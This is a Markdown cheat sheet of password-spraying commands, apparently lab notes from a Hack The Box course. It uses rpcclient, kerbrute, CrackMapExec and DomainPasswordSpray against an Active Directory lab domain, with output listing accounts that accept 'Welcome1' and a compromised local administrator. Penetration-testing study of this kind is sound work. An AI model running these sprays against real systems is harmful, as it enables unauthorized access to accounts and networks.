# Password Spraying

## Linux

### Manual Method

```sh
htb-student@eq-attack01:~$ while IFS= read -r u; do rpcclient -U "$u%Welcome1" 172.16.5.5 -c "getusername;quit" | grep Authority; done < valid_usernames.txt
```

```output title="Output"
Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: mholliday, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

### Kerbrute

```sh
htb-student@eq-attack01:~$ kerbrute passwordspray --dc 172.16.5.5 -d INLANEFREIGHT.LOCAL valid_usernames.txt Welcome1
```

```output title="Output"
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 05/23/25 - Ronnie Flathers @ropnop

2025/05/23 17:45:03 >  Using KDC(s):
2025/05/23 17:45:03 >   172.16.5.5:88

2025/05/23 17:45:03 >  [+] VALID LOGIN:  tjohnson@INLANEFREIGHT.LOCAL:Welcome1
2025/05/23 17:45:03 >  [+] VALID LOGIN:  mholliday@INLANEFREIGHT.LOCAL:Welcome1
2025/05/23 17:45:04 >  [+] VALID LOGIN:  sgage@INLANEFREIGHT.LOCAL:Welcome1
2025/05/23 17:45:04 >  Done! Tested 56 logins (3 successes) in 0.194 seconds
```

### CrackMapExec

```sh
htb-student@eq-attack01:~$ crackmapexec smb 172.16.5.5 -u valid_usernames.txt -p 'Welcome1' | grep +
```

```output title="Output"
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\tjohnson:Welcome1
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\mholliday:Welcome1
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sgage:Welcome1
```

### CrackMapExec (Local Administrator)

| FLAG | ASSUMED ACCOUNT | LOCKOUT RISK |
|---|---|---|
|| INLANEFREIGHT.LOCAL\Administrator | + |
| --local-auth | ACADEMY-EA-FILE\Administrator ||

```sh
htb-student@eq-attack01:~$ crackmapexec smb 172.16.5.0/23 -u 'Administrator' -p 'Welcome1' --local-auth | grep +
```

```output title="Output"
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] ACADEMY-EA-FILE\Administrator:Welcome1 (Pwn3d!)
```

## Windows

### [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)

```pwsh
PS C:\Users\htb-student> Invoke-DomainPasswordSpray -Force -Password Winter2022 -OutFile success.txt -ErrorAction SilentlyContinue
```

### DomainPasswordSpray (UserList)

```pwsh
PS C:\Users\htb-student> Invoke-DomainPasswordSpray -Force -UserList valid_usernames.txt -Password Winter2022 -OutFile success.txt -ErrorAction SilentlyContinue
```
